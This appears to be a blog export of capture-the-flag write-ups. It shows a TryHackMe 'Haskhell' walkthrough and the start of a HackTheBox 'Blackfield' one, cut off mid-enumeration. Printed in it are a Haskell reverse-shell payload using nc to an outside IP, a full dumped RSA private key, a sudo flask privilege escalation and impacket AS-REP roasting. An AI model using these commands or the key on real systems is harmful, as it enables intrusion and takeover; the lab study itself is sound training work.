=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://hask.thm:5001/ [+] Threads:        10 [+] Wordlist:       /usr/share/dirb/wordlists/common.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Timeout:        10s =============================================================== 2020/07/08 03:33:08 Starting gobuster =============================================================== /submit (Status: 200) =============================================================== 2020/07/08 03:36:03 Finished ===============================================================   So it’s not uploads but it’s Submit.   Tried a bunch of stuff like uploading a PHP shell and stuff like that, but nothing seems to be working.      Remembering from previous pages this site probably accepts a haskell scripts.   Reverse shell   A little bit research on haskell I found that we can call a command using the below script.   root@Ac3:~/Haskhell# cat shell.hs  module Main where  import System.Process  main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f\"   Uploading the file and starting up a listner nc -lnvp 5566 and visiting the url hask.thm/uploads/shell.hs gave me the reverse shell.   root@Ac3:~/Haskhell# nc -lnvp 5566 listening on [any] 5566 ... connect to [10.9.2.148] from (UNKNOWN) [10.10.129.213] 44224 /bin/sh: 0: can't access tty; job control turned off $ id uid=1001(flask) gid=1001(flask) groups=1001(flask) $       We can use python -c 'import pty;pty.spawn(\"/bin/bash\");' for a shell upgrade.    Getting User.txt   flask@haskhell:/home$ ls flask  haskell  prof flask@haskhell:/home$  flask@haskhell:/home$ cd prof cd prof flask@haskhell:/home/prof$ ls ls __pycache__  user.txt flask@haskhell:/home/prof$ cat user.txt cat user.txt flag{--------------}   From here I see a .ssh folder which contains the id_rsa of professor, So I copied that to my kali and used ssh to login as prof.   flask@haskhell:/home/prof/.ssh$ cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++ 6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr 7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2 o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67 54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2 kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY 3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U /cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S /+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA== -----END RSA PRIVATE KEY-----  SSH to Prof   root@Ac3:~/Haskhell# ssh -i id_rsa prof@hask.thm The authenticity of host 'hask.thm (10.10.129.213)' can't be established. ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'hask.thm,10.10.129.213' (ECDSA) to the list of known hosts. Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/advantage    System information as of Wed Jul  8 08:06:37 UTC 2020    System load:  0.0                Processes:           108   Usage of /:   26.3% of 19.56GB   Users logged in:     0   Memory usage: 48%                IP address for eth0: 10.10.129.213   Swap usage:   0%   39 packages can be updated. 0 updates are security updates.   Last login: Wed May 27 18:45:06 2020 from 192.168.126.128 $ id uid=1002(prof) gid=1002(prof) groups=1002(prof)      We can use python -c 'import pty;pty.spawn(\"/bin/bash\");' for a shell upgrade.     $ python -c 'import pty;pty.spawn(\"/bin/bash\");' prof@haskhell:~$     Checking the priv of prof   prof@haskhell:~$ sudo -l Matching Defaults entries for prof on haskhell:     env_reset, env_keep+=FLASK_APP, mail_badpass,     secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User prof may run the following commands on haskhell:     (root) NOPASSWD: /usr/bin/flask run   Privilege Escalation   prof@haskhell:~$ nano root.py import os os.system(\"/bin/sh\") prof@haskhell:~$ nano root.py prof@haskhell:~$ export FLASK_APP=root.py prof@haskhell:~$ sudo flask run # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt flag{*****************}   If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["tryhackme"],
        "tags": ["linux,","gobuster,","boot2root"],
        "url": "/tryhackme/Haskhell/",
        "teaser": "/assets/img/sample/hask/hask.png"
      },{
        "title": "Hackthebox Blackfiled",
        "excerpt":"INFO:                  Blackfield                               OS:       Windows                 Difficulty:       Hard                 Points:       40                 Release:       06 Jun 2020                 IP:       10.10.10.192           let’s start hacking into blackfiled   As always hacking starts with NMAP scan.   root@Ac3:~# nmap -O -A -T4 blackfiled.htb                                                                                                                                                                                              Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 08:45 EDT                                                                                                                                                                             Nmap scan report for blackfiled.htb (10.10.10.192)                                                                                                                                                                                          Host is up (0.19s latency).                                                                                                                                                                                                                 Not shown: 993 filtered ports                                                                                                                                                                                                               PORT     STATE SERVICE       VERSION                                                                                                                                                                                                        53/tcp   open  domain?                                                                                                                                                                                                                      | fingerprint-strings:                                                                                                                                                                                                                      |   DNSVersionBindReqTCP:                                                                                                                                                                                                                   |     version |_    bind 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 19:49:04Z) 135/tcp  open  msrpc         Microsoft Windows RPC 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp  open  microsoft-ds? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=7/11%Time=5F09B484%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\"); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: 7h03m11s | smb2-security-mode:  |   2.02:  |_    Message signing enabled and required | smb2-time:  |   date: 2020-07-11T19:51:44 |_  start_date: N/A  TRACEROUTE (using port 53/tcp) HOP RTT       ADDRESS 1   185.74 ms 10.10.14.1 2   186.22 ms blackfiled.htb (10.10.10.192)  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 224.21 seconds   SMB enumeration   Enter WORKGROUP\\root's password:           Sharename       Type      Comment         ---------       ----      -------         ADMIN$          Disk      Remote Admin         C$              Disk      Default share         forensic        Disk      Forensic / Audit share.         IPC$            IPC       Remote IPC         NETLOGON        Disk      Logon server share          profiles$       Disk               SYSVOL          Disk      Logon server share  SMB1 disabled -- no workgroup available    Having a look in profiles$   root@Ac3:~# smbclient //10.10.10.192/profiles$ Enter WORKGROUP\\root's password:  Try \"help\" to get a list of possible commands. smb: \\&gt; ls   .                                   D        0  Wed Jun  3 12:47:12 2020   ..                                  D        0  Wed Jun  3 12:47:12 2020   AAlleni                             D        0  Wed Jun  3 12:47:11 2020   ABarteski                           D        0  Wed Jun  3 12:47:11 2020   ABekesz                             D        0  Wed Jun  3 12:47:11 2020   ABenzies                            D        0  Wed Jun  3 12:47:11 2020   ABiemiller                          D        0  Wed Jun  3 12:47:11 2020   AChampken                           D        0  Wed Jun  3 12:47:11 2020   ACheretei                           D        0  Wed Jun  3 12:47:11 2020   ACsonaki                            D        0  Wed Jun  3 12:47:11 2020   AHigchens                           D        0  Wed Jun  3 12:47:11 2020   AJaquemai                           D        0  Wed Jun  3 12:47:11 2020   AKlado                              D        0  Wed Jun  3 12:47:11 2020   AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020   AKollolli                           D        0  Wed Jun  3 12:47:11 2020   AKruppe                             D        0  Wed Jun  3 12:47:11 2020   AKubale                             D        0  Wed Jun  3 12:47:11 2020   ALamerz                             D        0  Wed Jun  3 12:47:11 2020   AMaceldon                           D        0  Wed Jun  3 12:47:11 2020   AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                    ATaueg                              D        0  Wed Jun  3 12:47:11 2020   ATwardowski                         D        0  Wed Jun  3 12:47:11 2020   audit2020                           D        0  Wed Jun  3 12:47:11 2020   AWangenheim                         D        0  Wed Jun  3 12:47:11 2020   AWorsey                             D        0  Wed Jun  3 12:47:11 2020   AZigmunt                            D        0  Wed Jun  3 12:47:11 2020   BBakajza                            D        0  Wed Jun  3 12:47:11 2020   BBeloucif                           D        0  Wed Jun  3 12:47:11 2020   BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020   BConsultant                         D        0  Wed Jun  3 12:47:11 2020   BErdossy                            D        0  Wed Jun  3 12:47:11 2020   BGeminski                           D        0  Wed Jun  3 12:47:11 2020   BLostal                             D        0  Wed Jun  3 12:47:11 2020   BMannise                            D        0  Wed Jun  3 12:47:11 2020   BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020   BRigiero                            D        0  Wed Jun  3 12:47:11 2020   BSamkoses                           D        0  Wed Jun  3 12:47:11 2020   BZandonella                         D        0  Wed Jun  3 12:47:11 2020   CAcherman                           D        0  Wed Jun  3 12:47:12 2020   CAkbari                             D        0  Wed Jun  3 12:47:12 2020   CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020   CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020   CDufrasne                           D        0  Wed Jun  3 12:47:12 2020   CGronk                              D        0  Wed Jun  3 12:47:11 2020   Chiucarello                         D        0  Wed Jun  3 12:47:11 2020   Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020   CHoytal                             D        0  Wed Jun  3 12:47:12 2020   CKijauskas                          D        0  Wed Jun  3 12:47:12 2020   CKolbo                              D        0  Wed Jun  3 12:47:12 2020   CMakutenas                          D        0  Wed Jun  3 12:47:12 2020   CMorcillo                           D        0  Wed Jun  3 12:47:11 2020   CSchandall                          D        0  Wed Jun  3 12:47:12 2020   CSelters                            D        0  Wed Jun  3 12:47:12 2020   CTolmie                             D        0  Wed Jun  3 12:47:12 2020   DCecere                             D        0  Wed Jun  3 12:47:12 2020   DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020   DCwilich                            D        0  Wed Jun  3 12:47:12 2020   DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020   DKemesies                           D        0  Wed Jun  3 12:47:12 2020   DMatuka                             D        0  Wed Jun  3 12:47:12 2020   DMedeme                             D        0  Wed Jun  3 12:47:12 2020   DMeherek                            D        0  Wed Jun  3 12:47:12 2020   DMetych                             D        0  Wed Jun  3 12:47:12 2020   DPaskalev                           D        0  Wed Jun  3 12:47:12 2020   DPriporov                           D        0  Wed Jun  3 12:47:12 2020   DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020   DVellela                            D        0  Wed Jun  3 12:47:12 2020   DVogleson                           D        0  Wed Jun  3 12:47:12 2020   DZwinak                             D        0  Wed Jun  3 12:47:12 2020   EBoley                              D        0  Wed Jun  3 12:47:12 2020   EEulau                              D        0  Wed Jun  3 12:47:12 2020   EFeatherling                        D        0  Wed Jun  3 12:47:12 2020   EFrixione                           D        0  Wed Jun  3 12:47:12 2020   EJenorik                            D        0  Wed Jun  3 12:47:12 2020   EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020   ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020   EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020   EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020   EPryar                              D        0  Wed Jun  3 12:47:12 2020   ESachhitello                        D        0  Wed Jun  3 12:47:12 2020   ESariotti                           D        0  Wed Jun  3 12:47:12 2020   ETurgano                            D        0  Wed Jun  3 12:47:12 2020   EWojtila                            D        0  Wed Jun  3 12:47:12 2020   FAlirezai                           D        0  Wed Jun  3 12:47:12 2020   FBaldwind                           D        0  Wed Jun  3 12:47:12 2020   FBroj                               D        0  Wed Jun  3 12:47:12 2020   FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020   FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020   FianLaginja                         D        0  Wed Jun  3 12:47:12 2020   FLasokowski                         D        0  Wed Jun  3 12:47:12 2020   FPflum                              D        0  Wed Jun  3 12:47:12 2020   FReffey                             D        0  Wed Jun  3 12:47:12 2020   GaBelithe                           D        0  Wed Jun  3 12:47:12 2020   Gareld                              D        0  Wed Jun  3 12:47:12 2020   GBatowski                           D        0  Wed Jun  3 12:47:12 2020   GForshalger                         D        0  Wed Jun  3 12:47:12 2020   GGomane                             D        0  Wed Jun  3 12:47:12 2020   GHisek                              D        0  Wed Jun  3 12:47:12 2020   GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020   GMerewether                         D        0  Wed Jun  3 12:47:12 2020   GQuinniey                           D        0  Wed Jun  3 12:47:12 2020   GRoswurm                            D        0  Wed Jun  3 12:47:12 2020   GWiegard                            D        0  Wed Jun  3 12:47:12 2020   HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020   HColantino                          D        0  Wed Jun  3 12:47:12 2020   HConforto                           D        0  Wed Jun  3 12:47:12 2020   HCunnally                           D        0  Wed Jun  3 12:47:12 2020   HGougen                             D        0  Wed Jun  3 12:47:12 2020   HKostova                            D        0  Wed Jun  3 12:47:12 2020   IChristijr                          D        0  Wed Jun  3 12:47:12 2020   IKoledo                             D        0  Wed Jun  3 12:47:12 2020   IKotecky                            D        0  Wed Jun  3 12:47:12 2020   ISantosi                            D        0  Wed Jun  3 12:47:12 2020   JAngvall                            D        0  Wed Jun  3 12:47:12 2020   JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020   JDanten                             D        0  Wed Jun  3 12:47:12 2020   JDjouka                             D        0  Wed Jun  3 12:47:12 2020   JKondziola                          D        0  Wed Jun  3 12:47:12 2020   JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020   JLuthner                            D        0  Wed Jun  3 12:47:12 2020   JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020   JPistachio                          D        0  Wed Jun  3 12:47:12 2020   JScima                              D        0  Wed Jun  3 12:47:12 2020   JSebaali                            D        0  Wed Jun  3 12:47:12 2020   JShoenherr                          D        0  Wed Jun  3 12:47:12 2020   JShuselvt                           D        0  Wed Jun  3 12:47:12 2020   KAmavisca                           D        0  Wed Jun  3 12:47:12 2020   KAtolikian                          D        0  Wed Jun  3 12:47:12 2020   KBrokinn                            D        0  Wed Jun  3 12:47:12 2020   KCockeril                           D        0  Wed Jun  3 12:47:12 2020   KColtart                            D        0  Wed Jun  3 12:47:12 2020   KCyster                             D        0  Wed Jun  3 12:47:12 2020   KDorney                             D        0  Wed Jun  3 12:47:12 2020   KKoesno                             D        0  Wed Jun  3 12:47:12 2020   KLangfur                            D        0  Wed Jun  3 12:47:12 2020   KMahalik                            D        0  Wed Jun  3 12:47:12 2020   KMasloch                            D        0  Wed Jun  3 12:47:12 2020   KMibach                             D        0  Wed Jun  3 12:47:12 2020   KParvankova                         D        0  Wed Jun  3 12:47:12 2020   KPregnolato                         D        0  Wed Jun  3 12:47:12 2020   KRasmor                             D        0  Wed Jun  3 12:47:12 2020   KShievitz                           D        0  Wed Jun  3 12:47:12 2020   KSojdelius                          D        0  Wed Jun  3 12:47:12 2020   KTambourgi                          D        0  Wed Jun  3 12:47:12 2020   KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020   KZyballa                            D        0  Wed Jun  3 12:47:12 2020   LBajewsky                           D        0  Wed Jun  3 12:47:12 2020   LBaligand                           D        0  Wed Jun  3 12:47:12 2020   LBarhamand                          D        0  Wed Jun  3 12:47:12 2020   LBirer                              D        0  Wed Jun  3 12:47:12 2020   LBobelis                            D        0  Wed Jun  3 12:47:12 2020   LChippel                            D        0  Wed Jun  3 12:47:12 2020   LChoffin                            D        0  Wed Jun  3 12:47:12 2020   LCominelli                          D        0  Wed Jun  3 12:47:12 2020   LDruge                              D        0  Wed Jun  3 12:47:12 2020   LEzepek                             D        0  Wed Jun  3 12:47:12 2020   LHyungkim                           D        0  Wed Jun  3 12:47:12 2020   LKarabag                            D        0  Wed Jun  3 12:47:12 2020   LKirousis                           D        0  Wed Jun  3 12:47:12 2020   LKnade                              D        0  Wed Jun  3 12:47:12 2020   LKrioua                             D        0  Wed Jun  3 12:47:12 2020   LLefebvre                           D        0  Wed Jun  3 12:47:12 2020   LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020   LMichoud                            D        0  Wed Jun  3 12:47:12 2020   LTindall                            D        0  Wed Jun  3 12:47:12 2020   LYturbe                             D        0  Wed Jun  3 12:47:12 2020   MArcynski                           D        0  Wed Jun  3 12:47:12 2020   MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020   MAttravanam                         D        0  Wed Jun  3 12:47:12 2020   MBrambini                           D        0  Wed Jun  3 12:47:12 2020   MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020   MHoerauf                            D        0  Wed Jun  3 12:47:12 2020   MKermarrec                          D        0  Wed Jun  3 12:47:12 2020   MKillberg                           D        0  Wed Jun  3 12:47:12 2020   MLapesh                             D        0  Wed Jun  3 12:47:12 2020   MMakhsous                           D        0  Wed Jun  3 12:47:12 2020   MMerezio                            D        0  Wed Jun  3 12:47:12 2020   MNaciri                             D        0  Wed Jun  3 12:47:12 2020   MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020   MSichkar                            D        0  Wed Jun  3 12:47:12 2020   MTemko                              D        0  Wed Jun  3 12:47:12 2020   MTipirneni                          D        0  Wed Jun  3 12:47:12 2020   MTonuri                             D        0  Wed Jun  3 12:47:12 2020   MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020   NBellibas                           D        0  Wed Jun  3 12:47:12 2020   NDikoka                             D        0  Wed Jun  3 12:47:12 2020   NGenevro                            D        0  Wed Jun  3 12:47:12 2020   NGoddanti                           D        0  Wed Jun  3 12:47:12 2020   NMrdirk                             D        0  Wed Jun  3 12:47:12 2020   NPulido                             D        0  Wed Jun  3 12:47:12 2020   NRonges                             D        0  Wed Jun  3 12:47:12 2020   NSchepkie                           D        0  Wed Jun  3 12:47:12 2020   NVanpraet                           D        0  Wed Jun  3 12:47:12 2020   OBelghazi                           D        0  Wed Jun  3 12:47:12 2020   OBushey                             D        0  Wed Jun  3 12:47:12 2020   OHardybala                          D        0  Wed Jun  3 12:47:12 2020   OLunas                              D        0  Wed Jun  3 12:47:12 2020   ORbabka                             D        0  Wed Jun  3 12:47:12 2020   PBourrat                            D        0  Wed Jun  3 12:47:12 2020   PBozzelle                           D        0  Wed Jun  3 12:47:12 2020   PBranti                             D        0  Wed Jun  3 12:47:12 2020   PCapperella                         D        0  Wed Jun  3 12:47:12 2020   PCurtz                              D        0  Wed Jun  3 12:47:12 2020   PDoreste                            D        0  Wed Jun  3 12:47:12 2020   PGegnas                             D        0  Wed Jun  3 12:47:12 2020   PMasulla                            D        0  Wed Jun  3 12:47:12 2020   PMendlinger                         D        0  Wed Jun  3 12:47:12 2020   PParakat                            D        0  Wed Jun  3 12:47:12 2020   PProvencer                          D        0  Wed Jun  3 12:47:12 2020   PTesik                              D        0  Wed Jun  3 12:47:12 2020   PVinkovich                          D        0  Wed Jun  3 12:47:12 2020   PVirding                            D        0  Wed Jun  3 12:47:12 2020   PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020   RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020   RBochare                            D        0  Wed Jun  3 12:47:12 2020   RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020   RNemnich                            D        0  Wed Jun  3 12:47:12 2020   RPoretsky                           D        0  Wed Jun  3 12:47:12 2020   RStuehringer                        D        0  Wed Jun  3 12:47:12 2020   RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020   RVallandas                          D        0  Wed Jun  3 12:47:12 2020   RWeatherl                           D        0  Wed Jun  3 12:47:12 2020   RWissor                             D        0  Wed Jun  3 12:47:12 2020   SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020   SAjowi                              D        0  Wed Jun  3 12:47:12 2020   SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020   SBonaparte                          D        0  Wed Jun  3 12:47:12 2020   SBouzane                            D        0  Wed Jun  3 12:47:12 2020   SChatin                             D        0  Wed Jun  3 12:47:12 2020   SDellabitta                         D        0  Wed Jun  3 12:47:12 2020   SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020   SEulert                             D        0  Wed Jun  3 12:47:12 2020   SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020   SGolds                              D        0  Wed Jun  3 12:47:12 2020   SGrifasi                            D        0  Wed Jun  3 12:47:12 2020   SGtlinas                            D        0  Wed Jun  3 12:47:12 2020   SHauht                              D        0  Wed Jun  3 12:47:12 2020   SHederian                           D        0  Wed Jun  3 12:47:12 2020   SHelregel                           D        0  Wed Jun  3 12:47:12 2020   SKrulig                             D        0  Wed Jun  3 12:47:12 2020   SLewrie                             D        0  Wed Jun  3 12:47:12 2020   SMaskil                             D        0  Wed Jun  3 12:47:12 2020   Smocker                             D        0  Wed Jun  3 12:47:12 2020   SMoyta                              D        0  Wed Jun  3 12:47:12 2020   SRaustiala                          D        0  Wed Jun  3 12:47:12 2020   SReppond                            D        0  Wed Jun  3 12:47:12 2020   SSicliano                           D        0  Wed Jun  3 12:47:12 2020   SSilex                              D        0  Wed Jun  3 12:47:12 2020   SSolsbak                            D        0  Wed Jun  3 12:47:12 2020   STousignaut                         D        0  Wed Jun  3 12:47:12 2020   support                             D        0  Wed Jun  3 12:47:12 2020   svc_backup                          D        0  Wed Jun  3 12:47:12 2020   SWhyte                              D        0  Wed Jun  3 12:47:12 2020   SWynigear                           D        0  Wed Jun  3 12:47:12 2020   TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020   TBadenbach                          D        0  Wed Jun  3 12:47:12 2020   TCaffo                              D        0  Wed Jun  3 12:47:12 2020   TCassalom                           D        0  Wed Jun  3 12:47:12 2020   TEiselt                             D        0  Wed Jun  3 12:47:12 2020   TFerencdo                           D        0  Wed Jun  3 12:47:12 2020   TGaleazza                           D        0  Wed Jun  3 12:47:12 2020   TKauten                             D        0  Wed Jun  3 12:47:12 2020   TKnupke                             D        0  Wed Jun  3 12:47:12 2020   TLintlop                            D        0  Wed Jun  3 12:47:12 2020   TMusselli                           D        0  Wed Jun  3 12:47:12 2020   TOust                               D        0  Wed Jun  3 12:47:12 2020   TSlupka                             D        0  Wed Jun  3 12:47:12 2020   TStausland                          D        0  Wed Jun  3 12:47:12 2020   TZumpella                           D        0  Wed Jun  3 12:47:12 2020   UCrofskey                           D        0  Wed Jun  3 12:47:12 2020   UMarylebone                         D        0  Wed Jun  3 12:47:12 2020   UPyrke                              D        0  Wed Jun  3 12:47:12 2020   VBublavy                            D        0  Wed Jun  3 12:47:12 2020   VButziger                           D        0  Wed Jun  3 12:47:12 2020   VFuscca                             D        0  Wed Jun  3 12:47:12 2020   VLitschauer                         D        0  Wed Jun  3 12:47:12 2020   VMamchuk                            D        0  Wed Jun  3 12:47:12 2020   VMarija                             D        0  Wed Jun  3 12:47:12 2020   VOlaosun                            D        0  Wed Jun  3 12:47:12 2020   VPapalouca                          D        0  Wed Jun  3 12:47:12 2020   WSaldat                             D        0  Wed Jun  3 12:47:12 2020   WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020   WZelazny                            D        0  Wed Jun  3 12:47:12 2020   XBemelen                            D        0  Wed Jun  3 12:47:12 2020   XDadant                             D        0  Wed Jun  3 12:47:12 2020   XDebes                              D        0  Wed Jun  3 12:47:12 2020   XKonegni                            D        0  Wed Jun  3 12:47:12 2020   XRykiel                             D        0  Wed Jun  3 12:47:12 2020   YBleasdale                          D        0  Wed Jun  3 12:47:12 2020   YHuftalin                           D        0  Wed Jun  3 12:47:12 2020   YKivlen                             D        0  Wed Jun  3 12:47:12 2020   YKozlicki                           D        0  Wed Jun  3 12:47:12 2020   YNyirenda                           D        0  Wed Jun  3 12:47:12 2020   YPredestin                          D        0  Wed Jun  3 12:47:12 2020   YSeturino                           D        0  Wed Jun  3 12:47:12 2020   YSkoropada                          D        0  Wed Jun  3 12:47:12 2020   YVonebers                           D        0  Wed Jun  3 12:47:12 2020   YZarpentine                         D        0  Wed Jun  3 12:47:12 2020   ZAlatti                             D        0  Wed Jun  3 12:47:12 2020   ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020   ZMalaab                             D        0  Wed Jun  3 12:47:12 2020   ZMiick                              D        0  Wed Jun  3 12:47:12 2020   ZScozzari                           D        0  Wed Jun  3 12:47:12 2020   ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020   ZWausik                             D        0  Wed Jun  3 12:47:12 2020                  7846143 blocks of size 4096. 3579546 blocks available smb: \\&gt;   making a username list from the profiles      Copy the usernames to a file users.txt and scan for Kerberos tickets.    Getting Kerberos ticket   Using impacket GetNPUsers.py to get the kerberos ticket.   GetNPUsers.py  blackfield.local/ -dc-ip blackfield.htb -usersfile users.txt -no-pass   After running impacket script we get the kerberos ticket of support.   [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) 